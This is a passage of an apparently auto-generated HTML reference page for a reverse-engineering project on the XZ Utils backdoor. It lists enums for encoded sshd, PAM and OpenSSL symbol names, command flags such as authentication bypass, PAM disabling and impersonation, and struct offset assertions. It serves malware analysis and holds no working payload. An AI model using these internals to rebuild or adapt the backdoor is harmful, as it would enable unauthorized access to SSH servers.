<tr class="memitem:a312257dd76472b76f479e15d180c4570"><td class="memItemLeft" align="right" valign="top"><a id="a312257dd76472b76f479e15d180c4570"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>ModRm_Mod</b> { <b>MRM_I_REG</b>
, <b>MRM_I_DISP1</b>
, <b>MRM_I_DISP4</b>
, <b>MRM_D_REG</b>
 }</td></tr>
<tr class="separator:a312257dd76472b76f479e15d180c4570"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af4d7fb9dcfda9656ed2c6aeaec3357be"><td class="memItemLeft" align="right" valign="top"><a id="af4d7fb9dcfda9656ed2c6aeaec3357be"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>FuncFindType</b> { <b>FIND_ENDBR64</b>
, <b>FIND_NOP</b>
 }</td></tr>
<tr class="separator:af4d7fb9dcfda9656ed2c6aeaec3357be"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3ed7f6d009d35ae3bdb830a7bb1e0289"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a3ed7f6d009d35ae3bdb830a7bb1e0289">ElfId</a> { <a class="el" href="xzre_8h.html#a3ed7f6d009d35ae3bdb830a7bb1e0289aba3b2cdb9ea0a8c79650d8c305d93898">X_ELF_MAIN</a> = 0
, <b>X_ELF_DYNAMIC_LINKER</b> = 1
, <b>X_ELF_LIBC</b> = 2
, <b>X_ELF_LIBCRYPTO</b> = 3
 }</td></tr>
<tr class="separator:a3ed7f6d009d35ae3bdb830a7bb1e0289"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a28fea6434bc30b26e47118825e2732fb"><td class="memItemLeft" align="right" valign="top"><a id="a28fea6434bc30b26e47118825e2732fb"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>StringXrefId</b> { <br />
&#160;&#160;<b>XREF_xcalloc_zero_size</b> = 0
, <b>XREF_Could_not_chdir_to_home_directory_s_s</b> = 1
, <b>XREF_list_hostkey_types</b> = 2
, <b>XREF_demote_sensitive_data</b> = 3
, <br />
&#160;&#160;<b>XREF_mm_terminate</b> = 4
, <b>XREF_mm_pty_allocate</b> = 5
, <b>XREF_mm_do_pam_account</b> = 6
, <b>XREF_mm_session_pty_cleanup2</b> = 7
, <br />
&#160;&#160;<b>XREF_mm_getpwnamallow</b> = 8
, <b>XREF_mm_sshpam_init_ctx</b> = 9
, <b>XREF_mm_sshpam_query</b> = 10
, <b>XREF_mm_sshpam_respond</b> = 11
, <br />
&#160;&#160;<b>XREF_mm_sshpam_free_ctx</b> = 12
, <b>XREF_mm_choose_dh</b> = 13
, <b>XREF_sshpam_respond</b> = 14
, <b>XREF_sshpam_auth_passwd</b> = 15
, <br />
&#160;&#160;<b>XREF_sshpam_query</b> = 16
, <b>XREF_start_pam</b> = 17
, <b>XREF_mm_request_send</b> = 18
, <b>XREF_mm_log_handler</b> = 19
, <br />
&#160;&#160;<b>XREF_Could_not_get_agent_socket</b> = 20
, <b>XREF_auth_root_allowed</b> = 21
, <b>XREF_mm_answer_authpassword</b> = 22
, <b>XREF_mm_answer_keyallowed</b> = 23
, <br />
&#160;&#160;<b>XREF_mm_answer_keyverify</b> = 24
, <b>XREF_48s_48s_d_pid_ld_</b> = 25
, <b>XREF_Unrecognized_internal_syslog_level_code_d</b> = 26
<br />
 }</td></tr>
<tr class="separator:a28fea6434bc30b26e47118825e2732fb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:afde1d1c69b6bedd0626eee956c7111de"><td class="memItemLeft" align="right" valign="top"><a id="afde1d1c69b6bedd0626eee956c7111de"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>EncodedStringId</b> { <br />
&#160;&#160;<b>STR_from</b> = 0x810
, <b>STR_ssh2</b> = 0x678
, <b>STR_48s_48s_d_pid_ld_</b> = 0xd8
, <b>STR_s</b> = 0x708
, <br />
&#160;&#160;<b>STR_usr_sbin_sshd</b> = 0x108
, <b>STR_Accepted_password_for</b> = 0x870
, <b>STR_Accepted_publickey_for</b> = 0x1a0
, <b>STR_BN_bin2bn</b> = 0xc40
, <br />
&#160;&#160;<b>STR_BN_bn2bin</b> = 0x6d0
, <b>STR_BN_dup</b> = 0x958
, <b>STR_BN_free</b> = 0x418
, <b>STR_BN_num_bits</b> = 0x4e0
, <br />
&#160;&#160;<b>STR_Connection_closed_by</b> = 0x790
, <b>STR_Could_not_chdir_to_home_directory_s_s</b> = 0x18
, <b>STR_Could_not_get_agent_socket</b> = 0xb0
, <b>STR_DISPLAY</b> = 0x960
, <br />
&#160;&#160;<b>STR_DSA_get0_pqg</b> = 0x9d0
, <b>STR_DSA_get0_pub_key</b> = 0x468
, <b>STR_EC_KEY_get0_group</b> = 0x7e8
, <b>STR_EC_KEY_get0_public_key</b> = 0x268
, <br />
&#160;&#160;<b>STR_EC_POINT_point2oct</b> = 0x6e0
, <b>STR_EVP_CIPHER_CTX_free</b> = 0xb28
, <b>STR_EVP_CIPHER_CTX_new</b> = 0x838
, <b>STR_EVP_DecryptFinal_ex</b> = 0x2a8
, <br />
&#160;&#160;<b>STR_EVP_DecryptInit_ex</b> = 0xc08
, <b>STR_EVP_DecryptUpdate</b> = 0x3f0
, <b>STR_EVP_Digest</b> = 0xf8
, <b>STR_EVP_DigestVerify</b> = 0x408
, <br />
&#160;&#160;<b>STR_EVP_DigestVerifyInit</b> = 0x118
, <b>STR_EVP_MD_CTX_free</b> = 0xd10
, <b>STR_EVP_MD_CTX_new</b> = 0xaf8
, <b>STR_EVP_PKEY_free</b> = 0x6f8
, <br />
&#160;&#160;<b>STR_EVP_PKEY_new_raw_public_key</b> = 0x758
, <b>STR_EVP_PKEY_set1_RSA</b> = 0x510
, <b>STR_EVP_chacha20</b> = 0xc28
, <b>STR_EVP_sha256</b> = 0xc60
, <br />
&#160;&#160;<b>STR_EVP_sm</b> = 0x188
, <b>STR_GLIBC_2_2_5</b> = 0x8c0
, <b>STR_GLRO_dl_naudit_naudit</b> = 0x6a8
, <b>STR_KRB5CCNAME</b> = 0x1e0
, <br />
&#160;&#160;<b>STR_LD_AUDIT</b> = 0xcf0
, <b>STR_LD_BIND_NOT</b> = 0xbc0
, <b>STR_LD_DEBUG</b> = 0xa90
, <b>STR_LD_PROFILE</b> = 0xb98
, <br />
&#160;&#160;<b>STR_LD_USE_LOAD_BIAS</b> = 0x3e0
, <b>STR_LINES</b> = 0xa88
, <b>STR_RSA_free</b> = 0xac0
, <b>STR_RSA_get0_key</b> = 0x798
, <br />
&#160;&#160;<b>STR_RSA_new</b> = 0x918
, <b>STR_RSA_public_decrypt</b> = 0x1d0
, <b>STR_RSA_set0_key</b> = 0x540
, <b>STR_RSA_sign</b> = 0x8f8
, <br />
&#160;&#160;<b>STR_SSH_2_0</b> = 0x990
, <b>STR_TERM</b> = 0x4a8
, <b>STR_Unrecognized_internal_syslog_level_code_d</b> = 0xe0
, <b>STR_WAYLAND_DISPLAY</b> = 0x158
, <br />
&#160;&#160;<b>STR_errno_location</b> = 0x878
, <b>STR_libc_stack_end</b> = 0x2b0
, <b>STR_libc_start_main</b> = 0x228
, <b>STR_dl_audit_preinit</b> = 0xa60
, <br />
&#160;&#160;<b>STR_dl_audit_symbind_alt</b> = 0x9c8
, <b>STR_exit</b> = 0x8a8
, <b>STR_r_debug</b> = 0x5b0
, <b>STR_rtld_global</b> = 0x5b8
, <br />
&#160;&#160;<b>STR_rtld_global_ro</b> = 0xa98
, <b>STR_auth_root_allowed</b> = 0xb8
, <b>STR_authenticating</b> = 0x1d8
, <b>STR_demote_sensitive_data</b> = 0x28
, <br />
&#160;&#160;<b>STR_getuid</b> = 0x348
, <b>STR_ld_linux_x86_64_so</b> = 0xa48
, <b>STR_libc_so</b> = 0x7d0
, <b>STR_libcrypto_so</b> = 0x7c0
, <br />
&#160;&#160;<b>STR_liblzma_so</b> = 0x590
, <b>STR_libsystemd_so</b> = 0x938
, <b>STR_list_hostkey_types</b> = 0x20
, <b>STR_malloc_usable_size</b> = 0x440
, <br />
&#160;&#160;<b>STR_mm_answer_authpassword</b> = 0xc0
, <b>STR_mm_answer_keyallowed</b> = 0xc8
, <b>STR_mm_answer_keyverify</b> = 0xd0
, <b>STR_mm_answer_pam_start</b> = 0x948
, <br />
&#160;&#160;<b>STR_mm_choose_dh</b> = 0x78
, <b>STR_mm_do_pam_account</b> = 0x40
, <b>STR_mm_getpwnamallow</b> = 0x50
, <b>STR_mm_log_handler</b> = 0xa8
, <br />
&#160;&#160;<b>STR_mm_pty_allocate</b> = 0x38
, <b>STR_mm_request_send</b> = 0xa0
, <b>STR_mm_session_pty_cleanup2</b> = 0x48
, <b>STR_mm_sshpam_free_ctx</b> = 0x70
, <br />
&#160;&#160;<b>STR_mm_sshpam_init_ctx</b> = 0x58
, <b>STR_mm_sshpam_query</b> = 0x60
, <b>STR_mm_sshpam_respond</b> = 0x68
, <b>STR_mm_terminate</b> = 0x30
, <br />
&#160;&#160;<b>STR_parse_PAM</b> = 0xc58
, <b>STR_password</b> = 0x400
, <b>STR_preauth</b> = 0x4f0
, <b>STR_pselect</b> = 0x690
, <br />
&#160;&#160;<b>STR_publickey</b> = 0x7b8
, <b>STR_read</b> = 0x308
, <b>STR_rsa_sha2_256</b> = 0x710
, <b>STR_setlogmask</b> = 0x428
, <br />
&#160;&#160;<b>STR_setresgid</b> = 0x5f0
, <b>STR_setresuid</b> = 0xab8
, <b>STR_shutdown</b> = 0x760
, <b>STR_ssh_2_0</b> = 0xd08
, <br />
&#160;&#160;<b>STR_ssh_rsa_cert_v01_openssh_com</b> = 0x2c8
, <b>STR_sshpam_auth_passwd</b> = 0x88
, <b>STR_sshpam_query</b> = 0x90
, <b>STR_sshpam_respond</b> = 0x80
, <br />
&#160;&#160;<b>STR_start_pam</b> = 0x98
, <b>STR_system</b> = 0x9f8
, <b>STR_unknown</b> = 0x198
, <b>STR_user</b> = 0xb10
, <br />
&#160;&#160;<b>STR_write</b> = 0x380
, <b>STR_xcalloc_zero_size</b> = 0x10
, <b>STR_yolAbejyiejuvnupEvjtgvsh5okmkAvj</b> = 0xb00
, <b>STR_ELF</b> = 0x300
<br />
 }</td></tr>
<tr class="separator:afde1d1c69b6bedd0626eee956c7111de"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aca1fd1d8935433e6ba2e3918214e07f9"><td class="memItemLeft" align="right" valign="top"><a id="aca1fd1d8935433e6ba2e3918214e07f9"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>LogLevel</b> { <br />
&#160;&#160;<b>SYSLOG_LEVEL_QUIET</b>
, <b>SYSLOG_LEVEL_FATAL</b>
, <b>SYSLOG_LEVEL_ERROR</b>
, <b>SYSLOG_LEVEL_INFO</b>
, <br />
&#160;&#160;<b>SYSLOG_LEVEL_VERBOSE</b>
, <b>SYSLOG_LEVEL_DEBUG1</b>
, <b>SYSLOG_LEVEL_DEBUG2</b>
, <b>SYSLOG_LEVEL_DEBUG3</b>
, <br />
&#160;&#160;<b>SYSLOG_LEVEL_NOT_SET</b> = -1
<br />
 }</td></tr>
<tr class="separator:aca1fd1d8935433e6ba2e3918214e07f9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a5f8f63d8ae502ab76547c7b077cb067c"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067c">CommandFlags1</a> { <br />
&#160;&#160;<a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067cafba8acd8c4a8c3f257a5620490a68232">X_FLAGS1_8BYTES</a> = 0x1
, <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067ca032a69d073a86b964606f2c5ae97b0b8">X_FLAGS1_SETLOGMASK</a> = 0x4
, <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067cab7a7a5213fa1e7474dec3e176818dbcf">X_FLAGS1_SOCKET_INDEX</a> = 0x20
, <a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067cafeb5d1f0d173f2f31c172fa0332b63f9">X_FLAGS1_DISABLE_PAM</a> = 0x40
, <br />
&#160;&#160;<a class="el" href="xzre_8h.html#a5f8f63d8ae502ab76547c7b077cb067cab3d0e0689ad88a177dba9c825397c435">X_FLAGS1_NO_EXTENDED_SIZE</a> = 0x80
<br />
 }</td></tr>
<tr class="separator:a5f8f63d8ae502ab76547c7b077cb067c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a408b28a8a0686c2ba0ede1e1b4208348"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348">CommandFlags2</a> { <br />
&#160;&#160;<a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348af0f9ab9ee46a1670a961d250dbc3db4c">X_FLAGS2_IMPERSONATE</a> = 0x1
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348a12bbf24d2d421ed1a8b6418a2e432e75">X_FLAGS2_CHANGE_MONITOR_REQ</a> = 0x2
, <b>X_FLAGS2_AUTH_BYPASS</b> = 0x4
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348ad2b412b7978b940d31491d0715bb3e58">X_FLAGS2_CONTINUATION</a> = 0x40
, <br />
&#160;&#160;<a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348a5fe15faf982a7569ba41669ba8590f8b">X_FLAGS2_PSELECT</a> = 0xC0
, <a class="el" href="xzre_8h.html#a408b28a8a0686c2ba0ede1e1b4208348af06d978f6e3f18e92bd0aede40d0fbc2">X_FLAGS2_SOCKFD_MASK</a> = 0x78
<br />
 }</td></tr>
<tr class="separator:a408b28a8a0686c2ba0ede1e1b4208348"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abe6f94ea5911ce9fe472717add623449"><td class="memItemLeft" align="right" valign="top">enum &#160;</td><td class="memItemRight" valign="bottom"><a class="el" href="xzre_8h.html#abe6f94ea5911ce9fe472717add623449">CommandFlags3</a> { <a class="el" href="xzre_8h.html#abe6f94ea5911ce9fe472717add623449ae5ecf92095438c6d9e412262ac2c729b">X_FLAGS3_SOCKET_NUM</a> = 0x1F
, <a class="el" href="xzre_8h.html#abe6f94ea5911ce9fe472717add623449a50c316bd0e353771f0ffbbc27e503644">X_FLAGS3_MONITOR_REQ_VAL</a> = 0x3F
 }</td></tr>
<tr class="separator:abe6f94ea5911ce9fe472717add623449"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a27327a3338b74bd9c2ceec2e6a6af6e9"><td class="memItemLeft" align="right" valign="top"><a id="a27327a3338b74bd9c2ceec2e6a6af6e9"></a>enum &#160;</td><td class="memItemRight" valign="bottom"><b>SocketMode</b> { <b>DIR_WRITE</b> = 0
, <b>DIR_READ</b> = 1
 }</td></tr>
<tr class="separator:a27327a3338b74bd9c2ceec2e6a6af6e9"><td class="memSeparator" colspan="2">&#160;</td></tr>
</table><table class="memberdecls">
<tr class="heading"><td colspan="2"><h2 class="groupheader"><a name="func-members"></a>
Functions</h2></td></tr>
<tr class="memitem:ab8c632203357dc8287b1853f9a7b8085"><td class="memItemLeft" align="right" valign="top"><a id="ab8c632203357dc8287b1853f9a7b8085"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structgot__ctx.html">got_ctx_t</a>, got_ptr, 0)</td></tr>
<tr class="separator:ab8c632203357dc8287b1853f9a7b8085"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a71c63a171e69270e8cc3eb62c1b007ca"><td class="memItemLeft" align="right" valign="top"><a id="a71c63a171e69270e8cc3eb62c1b007ca"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structgot__ctx.html">got_ctx_t</a>, return_address, 0x8)</td></tr>
<tr class="separator:a71c63a171e69270e8cc3eb62c1b007ca"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7f46da093f69bcfa80f1311f3f1f30fe"><td class="memItemLeft" align="right" valign="top"><a id="a7f46da093f69bcfa80f1311f3f1f30fe"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structgot__ctx.html">got_ctx_t</a>, cpuid_fn, 0x10)</td></tr>
<tr class="separator:a7f46da093f69bcfa80f1311f3f1f30fe"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a7d2c5c8b027cfc4c38badb34b0619158"><td class="memItemLeft" align="right" valign="top"><a id="a7d2c5c8b027cfc4c38badb34b0619158"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structgot__ctx.html">got_ctx_t</a>, got_offset, 0x18)</td></tr>
<tr class="separator:a7d2c5c8b027cfc4c38badb34b0619158"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a07340e0f8ca9df744bc24ed6a6d2414c"><td class="memItemLeft" align="right" valign="top"><a id="a07340e0f8ca9df744bc24ed6a6d2414c"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, symbol_ptr, 0)</td></tr>
<tr class="separator:a07340e0f8ca9df744bc24ed6a6d2414c"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:abdcf5b14ec9346789eafb86f225d42c9"><td class="memItemLeft" align="right" valign="top"><a id="abdcf5b14ec9346789eafb86f225d42c9"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, <a class="el" href="structgot__ctx.html">got_ctx</a>, 0x8)</td></tr>
<tr class="separator:abdcf5b14ec9346789eafb86f225d42c9"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ace8b543f9a35173e40d83faa3a895e17"><td class="memItemLeft" align="right" valign="top"><a id="ace8b543f9a35173e40d83faa3a895e17"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structelf__entry__ctx.html">elf_entry_ctx_t</a>, frame_address, 0x28)</td></tr>
<tr class="separator:ace8b543f9a35173e40d83faa3a895e17"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab3d792dd4e4c22999ebf91eb5648a1f4"><td class="memItemLeft" align="right" valign="top"><a id="ab3d792dd4e4c22999ebf91eb5648a1f4"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, instruction, 0)</td></tr>
<tr class="separator:ab3d792dd4e4c22999ebf91eb5648a1f4"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ab1eb145f12c67a4be49fbaa6e3099992"><td class="memItemLeft" align="right" valign="top"><a id="ab1eb145f12c67a4be49fbaa6e3099992"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, instruction_size, 8)</td></tr>
<tr class="separator:ab1eb145f12c67a4be49fbaa6e3099992"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a79e1a7055dcef8979c2b23a65ba621bb"><td class="memItemLeft" align="right" valign="top"><a id="a79e1a7055dcef8979c2b23a65ba621bb"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, flags, 0x10)</td></tr>
<tr class="separator:a79e1a7055dcef8979c2b23a65ba621bb"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8376690511def56513ab02a0fb86b164"><td class="memItemLeft" align="right" valign="top"><a id="a8376690511def56513ab02a0fb86b164"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, flags2, 0x11)</td></tr>
<tr class="separator:a8376690511def56513ab02a0fb86b164"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a66ca87eda04ad7144fcaf13d6067bd28"><td class="memItemLeft" align="right" valign="top"><a id="a66ca87eda04ad7144fcaf13d6067bd28"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, lock_rep_byte, 0x14)</td></tr>
<tr class="separator:a66ca87eda04ad7144fcaf13d6067bd28"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ad7d85682620d9dba765d7d59d30189b3"><td class="memItemLeft" align="right" valign="top"><a id="ad7d85682620d9dba765d7d59d30189b3"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, seg_byte, 0x15)</td></tr>
<tr class="separator:ad7d85682620d9dba765d7d59d30189b3"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a724f0c0e2d15e151ac23748aba1e2038"><td class="memItemLeft" align="right" valign="top"><a id="a724f0c0e2d15e151ac23748aba1e2038"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, osize_byte, 0x16)</td></tr>
<tr class="separator:a724f0c0e2d15e151ac23748aba1e2038"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a6ad414448b1c4074007ac89d200d9dc7"><td class="memItemLeft" align="right" valign="top"><a id="a6ad414448b1c4074007ac89d200d9dc7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, asize_byte, 0x17)</td></tr>
<tr class="separator:a6ad414448b1c4074007ac89d200d9dc7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a04116b65b09a6c53dd9352b6d5fbf0bf"><td class="memItemLeft" align="right" valign="top"><a id="a04116b65b09a6c53dd9352b6d5fbf0bf"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, vex_byte, 0x18)</td></tr>
<tr class="separator:a04116b65b09a6c53dd9352b6d5fbf0bf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8c6bce69c596f9af26184b6b02b5b76b"><td class="memItemLeft" align="right" valign="top"><a id="a8c6bce69c596f9af26184b6b02b5b76b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, vex_byte2, 0x19)</td></tr>
<tr class="separator:a8c6bce69c596f9af26184b6b02b5b76b"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a88758e34bd8e70469ee70187f0424caf"><td class="memItemLeft" align="right" valign="top"><a id="a88758e34bd8e70469ee70187f0424caf"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, vex_byte3, 0x1A)</td></tr>
<tr class="separator:a88758e34bd8e70469ee70187f0424caf"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a1e9aff34162fef534b67b1607f2c0393"><td class="memItemLeft" align="right" valign="top"><a id="a1e9aff34162fef534b67b1607f2c0393"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, rex_byte, 0x1B)</td></tr>
<tr class="separator:a1e9aff34162fef534b67b1607f2c0393"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:acd204ec028d99bfdd5f4442789667f60"><td class="memItemLeft" align="right" valign="top"><a id="acd204ec028d99bfdd5f4442789667f60"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm, 0x1C)</td></tr>
<tr class="separator:acd204ec028d99bfdd5f4442789667f60"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a38fd5334ee76d701cb9ea5ed59edb20a"><td class="memItemLeft" align="right" valign="top"><a id="a38fd5334ee76d701cb9ea5ed59edb20a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_mod, 0x1D)</td></tr>
<tr class="separator:a38fd5334ee76d701cb9ea5ed59edb20a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ac6195f64611e4619231a2565746d292a"><td class="memItemLeft" align="right" valign="top"><a id="ac6195f64611e4619231a2565746d292a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_reg, 0x1E)</td></tr>
<tr class="separator:ac6195f64611e4619231a2565746d292a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a2834cafae7e8ef36218929187afe78e5"><td class="memItemLeft" align="right" valign="top"><a id="a2834cafae7e8ef36218929187afe78e5"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, modrm_rm, 0x1F)</td></tr>
<tr class="separator:a2834cafae7e8ef36218929187afe78e5"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af16308fab53bc349f4ff8e54d8b35f6a"><td class="memItemLeft" align="right" valign="top"><a id="af16308fab53bc349f4ff8e54d8b35f6a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, imm64_reg, 0x20)</td></tr>
<tr class="separator:af16308fab53bc349f4ff8e54d8b35f6a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af1c3c1902b98bb609a84e4ee16b13ee7"><td class="memItemLeft" align="right" valign="top"><a id="af1c3c1902b98bb609a84e4ee16b13ee7"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, sib, 0x21)</td></tr>
<tr class="separator:af1c3c1902b98bb609a84e4ee16b13ee7"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a8e89e72b5ae1955d75b97adcbb9f1fc1"><td class="memItemLeft" align="right" valign="top"><a id="a8e89e72b5ae1955d75b97adcbb9f1fc1"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, sib_scale, 0x22)</td></tr>
<tr class="separator:a8e89e72b5ae1955d75b97adcbb9f1fc1"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:ae1f2e8c9cda11659c8931cf00d603d3a"><td class="memItemLeft" align="right" valign="top"><a id="ae1f2e8c9cda11659c8931cf00d603d3a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, sib_index, 0x23)</td></tr>
<tr class="separator:ae1f2e8c9cda11659c8931cf00d603d3a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:af0fe5f5f93ed1b51d3d3da4e70809d61"><td class="memItemLeft" align="right" valign="top"><a id="af0fe5f5f93ed1b51d3d3da4e70809d61"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, sib_base, 0x24)</td></tr>
<tr class="separator:af0fe5f5f93ed1b51d3d3da4e70809d61"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a92f57bfeaa7959d5aabe4d3de379448a"><td class="memItemLeft" align="right" valign="top"><a id="a92f57bfeaa7959d5aabe4d3de379448a"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, opcode, 0x28)</td></tr>
<tr class="separator:a92f57bfeaa7959d5aabe4d3de379448a"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a3de11c95cc0fe9586d7125c3aa0a1ff2"><td class="memItemLeft" align="right" valign="top"><a id="a3de11c95cc0fe9586d7125c3aa0a1ff2"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, mem_disp, 0x30)</td></tr>
<tr class="separator:a3de11c95cc0fe9586d7125c3aa0a1ff2"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:a63e08f3940f8ef224f578ed0107e3651"><td class="memItemLeft" align="right" valign="top"><a id="a63e08f3940f8ef224f578ed0107e3651"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, operand, 0x38)</td></tr>
<tr class="separator:a63e08f3940f8ef224f578ed0107e3651"><td class="memSeparator" colspan="2">&#160;</td></tr>
<tr class="memitem:aa2e50f205f98d5f025f5eb9ba07d039b"><td class="memItemLeft" align="right" valign="top"><a id="aa2e50f205f98d5f025f5eb9ba07d039b"></a>
&#160;</td><td class="memItemRight" valign="bottom"><b>assert_offset</b> (<a class="el" href="structdasm__ctx.html">dasm_ctx_t</a>, operand_zeroextended, 0x40)</td></tr>
